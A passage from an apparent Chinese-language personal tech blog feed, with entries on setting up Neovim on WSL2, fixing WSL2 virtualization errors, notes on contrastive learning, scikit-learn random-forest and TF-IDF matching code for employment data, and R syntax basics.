    <content type="html"><![CDATA[<p>想在我的wsl2的ubuntu上搞个neovim</p><hr><h1 id="安装和配置"><a href="#安装和配置" class="headerlink" title="安装和配置"></a>安装和配置</h1><p>由于<code>apt install</code>这种方式安装的neovim版本一般不是最新的，安装后续插件时可能产生版本冲突的问题，于是我采用如下方式安装：</p><ol><li>访问neovim的github发布页面：<a href="https://github.com/neovim/neovim/releases/tag/stable">Neovim Releases</a></li></ol><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">wget https://github.com/neovim/neovim/releases/download/stable/nvim-linux-x86_64.tar.gz<br></code></pre></td></tr></table></figure><hr><h1 id="lazyvim基本使用"><a href="#lazyvim基本使用" class="headerlink" title="lazyvim基本使用"></a>lazyvim基本使用</h1><p><code>空格</code>： 查看所有快捷键<br><code>空格+e</code> : 关闭&#x2F;打开 导航栏<br><code>H/L</code>：在相邻缓冲区之间切换<br><code>空格+ f + f</code>：查找文件<br><code>空格+ s+ s</code>：保存文件<br><code>空格+i + f</code>： 代码格式化<br><code>空格 + w + v</code>：垂直分割窗口<br><code>空格 + w + h/j/k/l</code>：在窗口之间移动<br><code>u</code> 撤销上一步操作</p><p>参考：<br><a href="https://blog.csdn.net/qq_58158950/article/details/143249690">lazyvim快速安装与入门使用-CSDN博客</a></p>]]></content>
    
    
    <categories>
      
      <category>Environment</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>对比学习</title>
    <link href="/2025/04/24/%E5%AF%B9%E6%AF%94%E5%AD%A6%E4%B9%A0/"/>
    <url>/2025/04/24/%E5%AF%B9%E6%AF%94%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<p><img src="/2024/10/29/hello-world/250424174731719.png"></p><ul><li>纯强化学习<ul><li>机器偶尔会收到一个标量奖励（比如游戏得分），用以指导学习过程</li><li>每个样本提供的信息量很少，可能只有几个比特</li></ul></li><li>监督学习<ul><li>监督学习中，机器预测每个输入的类别或者一些数值，这些预测基于由人类提供的数据（需要人类标注数据）</li><li>每个样本的信息量较大，从10比特到10000比特不等</li></ul></li><li>自监督学习<ul><li>自监督学习让机器预测输入数据的任何部分，这部分数据未被观察到的。例如，预测视频的未来帧。</li><li>这种方法的信息量最大，每个样本可以提供数百万比特的信息。</li></ul></li></ul><h1 id="对比学习"><a href="#对比学习" class="headerlink" title="对比学习"></a>对比学习</h1><p>supervised learning遇到的问题：标注错误</p>]]></content>
    
    
    <categories>
      
      <category>ai</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>wsl2使用日志</title>
    <link href="/2025/04/23/wsl2%E4%BD%BF%E7%94%A8%E6%97%A5%E5%BF%97/"/>
    <url>/2025/04/23/wsl2%E4%BD%BF%E7%94%A8%E6%97%A5%E5%BF%97/</url>
    
    <content type="html"><![CDATA[<p>一周没用wsl，打开一看成了这个样子<br><img src="/2024/10/29/hello-world/e-20250423010716739.png"><br>立刻想到了自己最近对安卓模拟器的各种操作，不知道是否产生了影响。</p><p>参考：<a href="https://zhuanlan.zhihu.com/p/700411014">【解决方法】Win11家庭版启用或关闭Windows功能中没有hyper-v？ - 知乎</a></p><p>最后发现是虚拟化服务（virtual machine platform)（hyper-v）被关了</p><p>解决方法：<br><img src="/2024/10/29/hello-world/e-20250423020908204.png"><br><img src="/2024/10/29/hello-world/e-20250423021012474.png"><br>打开“启用或关闭windows功能”</p><p><img src="/2024/10/29/hello-world/e-20250423021116574.png"><br>勾选“Virtual Machine Platform”选项并确定</p><p>重启电脑后即可正常使用wsl2<br><img src="/2024/10/29/hello-world/e-20250423021321394.png"></p><hr><p>我认为系统更新很可能占了一部分因素<br>因为我记得 之前在 windows功能 列表选项中，<br>虚拟服务是 “Hyper-V”<br>这次却变成了 “Virtual Machine Platform”</p><hr><p>之后又打开，又出现了不一样的报错:</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle">系统找不到指定的路径。 错误代码: wsl<span class="hljs-regexp">/service/</span>createinstance<span class="hljs-regexp">/createvm/</span>hcs/error_path_not_found press <span class="hljs-keyword">any</span> key to <span class="hljs-keyword">continue</span>...<br></code></pre></td></tr></table></figure><p>感到很奇怪，多次尝试后才解决<br>解决方法：<br>关闭virtual machine platform重启后再打开virtual machine platform重启</p>]]></content>
    
    
    <categories>
      
      <category>Environment</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>分类模型</title>
    <link href="/2025/04/19/%E6%A8%A1%E5%9E%8B%E8%AE%AD%E7%BB%83/"/>
    <url>/2025/04/19/%E6%A8%A1%E5%9E%8B%E8%AE%AD%E7%BB%83/</url>
    
    <content type="html"><![CDATA[<h1 id="使用某个模型进行训练的一般步骤"><a href="#使用某个模型进行训练的一般步骤" class="headerlink" title="使用某个模型进行训练的一般步骤"></a>使用某个模型进行训练的一般步骤</h1><ol><li>预处理数据集</li><li>划分数据集（训练集和测试集）</li><li>训练模型</li><li>测试模型</li><li>计算评估指标</li><li>保存模型</li></ol><hr><h1 id="数据集预处理"><a href="#数据集预处理" class="headerlink" title="数据集预处理"></a>数据集预处理</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 检查缺失值</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;缺失值统计：&quot;</span>)<br><span class="hljs-built_in">print</span>(df.isnull().<span class="hljs-built_in">sum</span>())<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 数据预处理</span><br><span class="hljs-comment"># 数值型特征填充均值</span><br>num_imputer = SimpleImputer(strategy=<span class="hljs-string">&#x27;mean&#x27;</span>)<br>df_num = df.select_dtypes(include=[<span class="hljs-string">&#x27;float64&#x27;</span>, <span class="hljs-string">&#x27;int64&#x27;</span>])<br>df_num_imputed = num_imputer.fit_transform(df_num)<br><br><span class="hljs-comment"># 分类特征填充众数</span><br>cat_imputer = SimpleImputer(strategy=<span class="hljs-string">&#x27;most_frequent&#x27;</span>)<br>df_cat = df.select_dtypes(include=[<span class="hljs-string">&#x27;object&#x27;</span>])<br>df_cat_imputed = cat_imputer.fit_transform(df_cat)<br><br><span class="hljs-comment"># 合并填充后的数据</span><br>df = pd.concat([pd.DataFrame(df_num_imputed, columns=df_num.columns),<br>                        pd.DataFrame(df_cat_imputed, columns=df_cat.columns)], axis=<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 定义数值型和分类特征</span><br>numerical_features = df.select_dtypes(include=[<span class="hljs-string">&#x27;float64&#x27;</span>, <span class="hljs-string">&#x27;int64&#x27;</span>]).columns<br>categorical_features = df.select_dtypes(include=[<span class="hljs-string">&#x27;object&#x27;</span>]).columns<br><br><span class="hljs-comment"># 定义预处理步骤</span><br>preprocessor = ColumnTransformer(<br>    transformers=[<br>        (<span class="hljs-string">&#x27;num&#x27;</span>, SimpleImputer(strategy=<span class="hljs-string">&#x27;mean&#x27;</span>), numerical_features),  <span class="hljs-comment"># 数值型特征填充均值</span><br>        (<span class="hljs-string">&#x27;cat&#x27;</span>, SimpleImputer(strategy=<span class="hljs-string">&#x27;most_frequent&#x27;</span>), categorical_features)  <span class="hljs-comment"># 分类特征填充众数</span><br>    ]<br>)<br><br><span class="hljs-comment"># 对数据进行预处理</span><br>df_imputed = pd.DataFrame(preprocessor.fit_transform(df), columns=numerical_features.tolist() + categorical_features.tolist())<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 删除包含缺失值的样本</span><br>df = df.dropna()<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 将布尔型特征转换为数值型</span><br>df_bool = df.select_dtypes(include=[<span class="hljs-string">&#x27;bool&#x27;</span>])<br>df[df_bool.columns] = df_bool.astype(<span class="hljs-built_in">int</span>)<br></code></pre></td></tr></table></figure><hr><p>数据集： 脱敏的个人信息+就业信息<br>目标： 预测一些个人信息的就业状态</p><h1 id="随机森林"><a href="#随机森林" class="headerlink" title="随机森林"></a>随机森林</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pandas <span class="hljs-keyword">as</span> pd<br><span class="hljs-keyword">from</span> sklearn.model_selection <span class="hljs-keyword">import</span> train_test_split<br><span class="hljs-keyword">from</span> sklearn.ensemble <span class="hljs-keyword">import</span> RandomForestClassifier<br><span class="hljs-keyword">from</span> sklearn.metrics <span class="hljs-keyword">import</span> accuracy_score, precision_score, recall_score, f1_score<br><span class="hljs-keyword">from</span> sklearn.preprocessing <span class="hljs-keyword">import</span> OneHotEncoder<br><span class="hljs-keyword">from</span> sklearn.compose <span class="hljs-keyword">import</span> ColumnTransformer<br><span class="hljs-keyword">from</span> sklearn.pipeline <span class="hljs-keyword">import</span> Pipeline<br><span class="hljs-keyword">import</span> matplotlib.pyplot <span class="hljs-keyword">as</span> plt<br><span class="hljs-keyword">import</span> joblib<br><span class="hljs-keyword">import</span> seaborn <span class="hljs-keyword">as</span> sns<br><br><span class="hljs-comment"># 设置字体支持中文</span><br>plt.rcParams[<span class="hljs-string">&#x27;font.sans-serif&#x27;</span>] = [<span class="hljs-string">&#x27;SimHei&#x27;</span>]  <span class="hljs-comment"># 使用黑体</span><br>plt.rcParams[<span class="hljs-string">&#x27;axes.unicode_minus&#x27;</span>] = <span class="hljs-literal">False</span>  <span class="hljs-comment"># 解决负号显示问题</span><br><br><span class="hljs-comment"># 读取数据</span><br>df = pd.read_excel(<span class="hljs-string">&#x27;train_set.xlsx&#x27;</span>)<br><br><span class="hljs-comment"># 检查数据</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;数据预览：&quot;</span>)<br><span class="hljs-built_in">print</span>(df.head(<span class="hljs-number">10</span>))<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;--------------------------&quot;</span>)<br><br><span class="hljs-comment"># 删除包含缺失值的样本</span><br>df = df.dropna()<br><br><span class="hljs-comment"># 分离特征和目标变量</span><br>X = df.drop(columns=[<span class="hljs-string">&#x27;label&#x27;</span>, <span class="hljs-string">&#x27;行业&#x27;</span>])  <span class="hljs-comment"># 特征</span><br>y = df[<span class="hljs-string">&#x27;label&#x27;</span>]  <span class="hljs-comment"># 目标变量</span><br><br><span class="hljs-comment"># 确定需要编码的非数值型特征</span><br>categorical_features = X.select_dtypes(include=[<span class="hljs-string">&#x27;object&#x27;</span>]).columns.tolist()<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;需要编码的分类特征: <span class="hljs-subst">&#123;categorical_features&#125;</span>&quot;</span>)<br><br><span class="hljs-comment"># 构建预处理和模型的流水线</span><br>preprocessor = ColumnTransformer(<br>    transformers=[<br>        (<span class="hljs-string">&#x27;cat&#x27;</span>, OneHotEncoder(handle_unknown=<span class="hljs-string">&#x27;ignore&#x27;</span>), categorical_features)  <span class="hljs-comment"># 对分类特征进行独热编码</span><br>    ],<br>    remainder=<span class="hljs-string">&#x27;passthrough&#x27;</span>  <span class="hljs-comment"># 其他数值型特征保持原样</span><br>)<br><br><span class="hljs-comment"># rf_model = RandomForestClassifier(n_estimators=100, random_state=42)</span><br><br>pipeline = Pipeline([<br>    (<span class="hljs-string">&#x27;preprocessor&#x27;</span>, preprocessor),  <span class="hljs-comment"># 数据预处理</span><br>    (<span class="hljs-string">&#x27;classifier&#x27;</span>, RandomForestClassifier(n_estimators=<span class="hljs-number">100</span>, random_state=<span class="hljs-number">42</span>))  <span class="hljs-comment"># 随机森林模型</span><br>])<br><br><span class="hljs-comment"># 分割数据为训练集和测试集</span><br>X_train, X_test, y_train, y_test = train_test_split(X, y, test_size=<span class="hljs-number">0.2</span>, random_state=<span class="hljs-number">42</span>)<br><br><span class="hljs-comment"># 训练模型</span><br>pipeline.fit(X_train, y_train)<br><br><span class="hljs-comment"># 在测试集上进行预测</span><br>y_pred = pipeline.predict(X_test)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=====================&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;预测结果预览：&quot;</span>)<br><span class="hljs-built_in">print</span>(y_pred[:<span class="hljs-number">10</span>])<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=====================&quot;</span>)<br><br><span class="hljs-comment"># 计算评估指标</span><br>accuracy = accuracy_score(y_test, y_pred)<br>precision = precision_score(y_test, y_pred)<br>recall = recall_score(y_test, y_pred)<br>f1 = f1_score(y_test, y_pred)<br><br><span class="hljs-comment"># 输出结果</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;准确率 (Accuracy): <span class="hljs-subst">&#123;accuracy:<span class="hljs-number">.4</span>f&#125;</span>&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;查准率 (Precision): <span class="hljs-subst">&#123;precision:<span class="hljs-number">.4</span>f&#125;</span>&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;召回率 (Recall): <span class="hljs-subst">&#123;recall:<span class="hljs-number">.4</span>f&#125;</span>&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;F1 值: <span class="hljs-subst">&#123;f1:<span class="hljs-number">.4</span>f&#125;</span>&quot;</span>)<br><br><br><br><span class="hljs-comment"># 从 Pipeline 中提取训练好的随机森林模型</span><br>rf_model = pipeline.named_steps[<span class="hljs-string">&#x27;classifier&#x27;</span>]<br><br><span class="hljs-comment"># 获取特征重要性</span><br>importances = rf_model.feature_importances_<br><br><span class="hljs-comment"># 从 OneHotEncoder 中提取编码后的特征名称</span><br>onehot_encoder = pipeline.named_steps[<span class="hljs-string">&#x27;preprocessor&#x27;</span>].transformers_[<span class="hljs-number">0</span>][<span class="hljs-number">1</span>]<br>encoded_feature_names = onehot_encoder.get_feature_names_out(categorical_features)<br><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;读热编码后的特征名称：&quot;</span>, encoded_feature_names)<br><br><span class="hljs-comment"># 数值特征名称</span><br>numerical_features = X.select_dtypes(include=[<span class="hljs-string">&#x27;float64&#x27;</span>, <span class="hljs-string">&#x27;int64&#x27;</span>]).columns.tolist()<br><br><span class="hljs-comment"># 合并所有特征名称（独热编码后的特征 + 数值特征）</span><br>all_feature_names = <span class="hljs-built_in">list</span>(encoded_feature_names) + numerical_features<br><br><span class="hljs-comment"># 初始化字典，用于聚合特征重要性到原始特征</span><br>feature_importance_dict = &#123;feature: <span class="hljs-number">0</span> <span class="hljs-keyword">for</span> feature <span class="hljs-keyword">in</span> X.columns&#125;<br><br><span class="hljs-comment"># 聚合独热编码特征的重要性</span><br><span class="hljs-keyword">for</span> i, feature <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(all_feature_names):<br>    <span class="hljs-comment"># 提取原始特征名</span><br>    original_feature = feature.split(<span class="hljs-string">&#x27;_&#x27;</span>)[<span class="hljs-number">0</span>] <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;_&#x27;</span> <span class="hljs-keyword">in</span> feature <span class="hljs-keyword">else</span> feature<br>    <span class="hljs-keyword">if</span> original_feature <span class="hljs-keyword">in</span> feature_importance_dict:<br>        feature_importance_dict[original_feature] += importances[i]<br><br><span class="hljs-comment"># 提取聚合后的特征名称和重要性</span><br>aggregated_feature_names = <span class="hljs-built_in">list</span>(feature_importance_dict.keys())<br>aggregated_importances = <span class="hljs-built_in">list</span>(feature_importance_dict.values())<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;================&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;聚合后的特征名称：&quot;</span>, aggregated_feature_names)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;聚合后的特征重要性：&quot;</span>, aggregated_importances)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;================&quot;</span>)<br><br><span class="hljs-comment"># 绘制条形图</span><br>plt.figure(figsize=(<span class="hljs-number">10</span>, <span class="hljs-number">8</span>))<br>sns.barplot(x=aggregated_importances, y=aggregated_feature_names)<br>plt.title(<span class="hljs-string">&#x27;Feature Importance (Aggregated)&#x27;</span>)<br>plt.xlabel(<span class="hljs-string">&#x27;重要性&#x27;</span>)<br>plt.ylabel(<span class="hljs-string">&#x27;特征&#x27;</span>)<br>plt.tight_layout()<br>plt.savefig(<span class="hljs-string">&quot;figure/feature_importance_aggregated.jpg&quot;</span>, dpi=<span class="hljs-number">500</span>)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;------------------&quot;</span>)<br><br><span class="hljs-comment"># 保存训练好的模型</span><br>joblib.dump(rf_model, <span class="hljs-string">&#x27;random_forest_model.pkl&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot; 模型已保存为 &#x27;random_forest_model.pkl&#x27;&quot;</span>)<br><br><br>predict_data = pd.read_excel(<span class="hljs-string">&#x27;predict_set.xlsx&#x27;</span>)<br><span class="hljs-comment"># 对预测集进行预处理</span><br>predict_data_transformed = pipeline.named_steps[<span class="hljs-string">&#x27;preprocessor&#x27;</span>].transform(predict_data)<br><br><span class="hljs-comment"># 使用模型进行预测</span><br>y_pred = rf_model.predict(predict_data_transformed)<br><br><span class="hljs-comment"># 保存结果</span><br>df_result = predict_data.copy()<br>df_result[<span class="hljs-string">&#x27;预测结果&#x27;</span>] = y_pred<br>df_result.to_csv(<span class="hljs-string">&#x27;./processed_data/predict_result_t2.csv&#x27;</span>, index=<span class="hljs-literal">False</span>, encoding=<span class="hljs-string">&#x27;utf-8-sig&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;预测完成，结果保存为 ./processed_data/predict_result_t2.csv&quot;</span>)<br></code></pre></td></tr></table></figure><p>优化：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> sklearn.ensemble <span class="hljs-keyword">import</span> RandomForestClassifier<br><span class="hljs-keyword">from</span> sklearn.model_selection <span class="hljs-keyword">import</span> GridSearchCV<br><br><span class="hljs-comment"># 定义随机森林模型</span><br>rf = RandomForestClassifier(random_state=<span class="hljs-number">42</span>)<br><br><span class="hljs-comment"># 定义超参数网格</span><br>param_grid = &#123;<br>    <span class="hljs-string">&#x27;n_estimators&#x27;</span>: [<span class="hljs-number">100</span>, <span class="hljs-number">200</span>, <span class="hljs-number">300</span>],<br>    <span class="hljs-string">&#x27;max_depth&#x27;</span>: [<span class="hljs-number">5</span>, <span class="hljs-number">10</span>, <span class="hljs-number">15</span>],<br>    <span class="hljs-string">&#x27;min_samples_split&#x27;</span>: [<span class="hljs-number">2</span>, <span class="hljs-number">5</span>, <span class="hljs-number">10</span>],<br>    <span class="hljs-string">&#x27;min_samples_leaf&#x27;</span>: [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">4</span>],<br>    <span class="hljs-string">&#x27;max_features&#x27;</span>: [<span class="hljs-string">&#x27;sqrt&#x27;</span>, <span class="hljs-string">&#x27;log2&#x27;</span>]<br>&#125;<br><br><span class="hljs-comment"># 网格搜索</span><br>grid_search = GridSearchCV(estimator=rf, param_grid=param_grid, cv=<span class="hljs-number">3</span>, scoring=<span class="hljs-string">&#x27;f1&#x27;</span>, verbose=<span class="hljs-number">2</span>, n_jobs=-<span class="hljs-number">1</span>)<br>grid_search.fit(X_train, y_train)<br><br><span class="hljs-comment"># 输出最佳参数</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;最佳参数：&quot;</span>, grid_search.best_params_)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;最佳得分：&quot;</span>, grid_search.best_score_)<br><br><span class="hljs-comment"># 使用最佳参数训练模型</span><br>best_rf = grid_search.best_estimator_<br></code></pre></td></tr></table></figure><p>优化方向：</p><ol><li><strong>调整超参数</strong>：通过网格搜索或随机搜索优化随机森林的超参数。</li><li><strong>特征选择</strong>：根据特征重要性选择重要特征。</li><li><strong>处理类别不平衡</strong>：通过调整 <code>class_weight</code> 参数平衡类别。</li><li><strong>交叉验证</strong>：使用交叉验证评估模型性能，避免过拟合。</li><li><strong>增加模型评估指标</strong>：输出混淆矩阵等更多评估指标。</li></ol><hr><h1 id="推荐匹配"><a href="#推荐匹配" class="headerlink" title="推荐匹配"></a>推荐匹配</h1><blockquote><p>基于简历文本和岗位文本的相似度，推荐最匹配的岗位，并将推荐结果保存到CSV文件中。</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pandas <span class="hljs-keyword">as</span> pd<br><span class="hljs-keyword">from</span> sklearn.feature_extraction.text <span class="hljs-keyword">import</span> TfidfVectorizer<br><span class="hljs-keyword">from</span> sklearn.metrics.pairwise <span class="hljs-keyword">import</span> cosine_similarity<br></code></pre></td></tr></table></figure><p>导入库<br>pandas：数据处理和操作<br>TfidVectorizer： 将文本数据转换为TF-IDF特征向量<br>cosine_similarity：计算简历和岗位文本之间的余弦相似度</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python">df_resume = df[[<span class="hljs-string">&quot;教育程度&quot;</span>, <span class="hljs-string">&quot;专业&quot;</span>, <span class="hljs-string">&quot;毕业学校&quot;</span>]]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">map_education_leavel</span>(<span class="hljs-params">code</span>):<br>education_map = &#123; ... &#125; <span class="hljs-comment"># 教育程度映射表</span><br><span class="hljs-keyword">try</span>: <br><span class="hljs-keyword">return</span> education_map.get(<span class="hljs-built_in">int</span>(code), <span class="hljs-string">&quot;未知&quot;</span>)<br><span class="hljs-keyword">except</span>:<br><span class="hljs-keyword">return</span> <span class="hljs-string">&quot;未知&quot;</span><br><br>df_resume.loc[:, <span class="hljs-string">&#x27;教育程度_文字&#x27;</span>] = df_resume[<span class="hljs-string">&#x27;教育程度&#x27;</span>]<br>df_resume.loc[:, <span class="hljs-string">&#x27;简历文本&#x27;</span>] = df_resume.fillna(<span class="hljs-string">&#x27;&#x27;</span>).astype(<span class="hljs-built_in">str</span>).agg(<span class="hljs-string">&#x27; &#x27;</span>.join, axis=<span class="hljs-number">1</span>)<br>df_resume = df_resume[[<span class="hljs-string">&quot;教育程度&quot;</span>, <span class="hljs-string">&quot;专业&quot;</span>, <span class="hljs-string">&quot;毕业学校&quot;</span>, <span class="hljs-string">&quot;简历文本&quot;</span>]]<br></code></pre></td></tr></table></figure><p>创</p>]]></content>
    
    
    <categories>
      
      <category>ai</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>R语言学习笔记</title>
    <link href="/2025/04/18/R%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <url>/2025/04/18/R%E8%AF%AD%E8%A8%80%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="基本语法"><a href="#基本语法" class="headerlink" title="基本语法"></a>基本语法</h1><h2 id="使用包"><a href="#使用包" class="headerlink" title="使用包"></a>使用包</h2><p>安装包</p><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs r">install.packages<span class="hljs-punctuation">(</span><span class="hljs-string">&quot;tidyr&quot;</span><span class="hljs-punctuation">)</span><br></code></pre></td></tr></table></figure><p><code>::</code>  访问某个包中的函数或变量，从而 无需将整个包加载到全局环境中。</p><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs r">tidyr<span class="hljs-operator">::</span>billboard<br></code></pre></td></tr></table></figure><p>与之相对的是<code>library()</code></p><figure class="highlight r"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs r">library<span class="hljs-punctuation">(</span>tidyr<span class="hljs-punctuation">)</span><br></code></pre></td></tr></table></figure><h2 id="赋值语句"><a href="#赋值语句" class="headerlink" title="赋值语句"></a>赋值语句</h2><p><code>&lt;-</code> <code>=</code></p><ul><li>在函数定义中设置默认参数时，通常使用<code>=</code></li><li>在函数调用时，使用<code>=</code>可以更明确地指定参数名</li></ul><p>只用在 函数调用&#x2F;定义 中 指定参数名&#x2F;设置默认参数 时，使用<code>=</code><br>其它情况推荐使用<code>&lt;-</code></p><p>一般的赋值语句，<code>&lt;-</code>更符合R的语法风格 </p><hr><h1 id="数据结构"><a href="#数据结构" class="headerlink" 